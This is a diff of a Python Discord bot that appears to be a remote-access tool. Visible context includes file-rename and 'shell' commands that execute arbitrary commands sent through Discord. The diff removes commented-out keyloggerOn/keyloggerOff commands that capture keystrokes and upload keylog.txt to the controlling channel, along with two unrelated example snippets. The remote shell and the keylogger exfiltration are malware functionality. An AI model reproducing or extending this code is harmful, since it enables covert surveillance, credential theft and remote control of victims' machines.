@@ -345,26 +345,7 @@ async def rename(ctx, file1, file2):
     await ctx.send(f"File renamed from {file1} to {file2}")
   except Exception as e:
     await ctx.send(f"There has been an error\n{e}")
-"""
-@bot.command()
-async def keyloggerOn(ctx):
-  try:
-    Keylogger(1)
-    await ctx.send("Keylogger started")
-  except Exception as e:
-    await ctx.send(f"There has been an error\n{e}")
-    
-@bot.command()
-async def keyloggerOff(ctx):
-  try:
-    Keylogger(0)
-    area = ctx.message.channel
-    await area.send(file=discord.File("keylog.txt"), content="File!")
-    await ctx.send("Keylogger Stopped/dumped")
-    os.remove("keylog.txt")
-  except Exception as e:
-    await ctx.send(f"There has been an error\n{e}")
-"""
+
 @bot.command()
 async def shell(ctx, *command):
   try:
@@ -374,69 +355,5 @@ async def shell(ctx, *command):
     
 
 
-
-  
-
-
-'''
-import argparse
-
-# Define a function to parse the user command
-def parse_command(user_input):
-    # Check if the input starts with '!'
-    if user_input.startswith('!'):
-        # Remove '!' from the input
-        user_input = user_input[1:]
-
-        # Create an ArgumentParser object for parsing command-line arguments
-        parser = argparse.ArgumentParser(description='User Command Parser')
-
-        # Define command-line options or arguments
-        parser.add_argument('-u', '--arg_u', type=int, help='Specify an integer for -u')
-        parser.add_argument('-c', '--arg_c', type=int, help='Specify an integer for -c')
-        parser.add_argument('-o', '--arg_o', type=int, help='Specify an integer for -o')
-
-        # Split the user input into a list of words
-        words = user_input.split()
-
-        try:
-            # Parse the command-line arguments from the input
-            args = parser.parse_args(words)
-
-            # Access the values of parsed arguments and perform actions based on them
-            if args.arg_u is not None:
-                print(f'-u argument: {args.arg_u}')
-            if args.arg_c is not None:
-                print(f'-c argument: {args.arg_c}')
-            if args.arg_o is not None:
-                print(f'-o argument: {args.arg_o}')
-        except argparse.ArgumentError:
-            print('Invalid command format. Use ! -u <integer> -c <integer> -o <integer>')
-
-# Example usage
-user_input = '! -u 123 -c 456 -o 789'
-parse_command(user_input)
-
-'''
-
-'''
-@client.command(name="command")
-async def _command(ctx):
-    global times_used
-    await ctx.send(f"y or n")
-
-    # This will make sure that the response will only be registered if the following
-    # conditions are met:
-    def check(msg):
-        return msg.author == ctx.author and msg.channel == ctx.channel and \
-        msg.content.lower() in ["y", "n"]
-
-    msg = await client.wait_for("message", check=check)
-    if msg.content.lower() == "y":
-        await ctx.send("You said yes!")
-    else:
-        await ctx.send("You said no!")
-
-    times_used = times_used + 1'''
 
 bot.run(TOKEN)
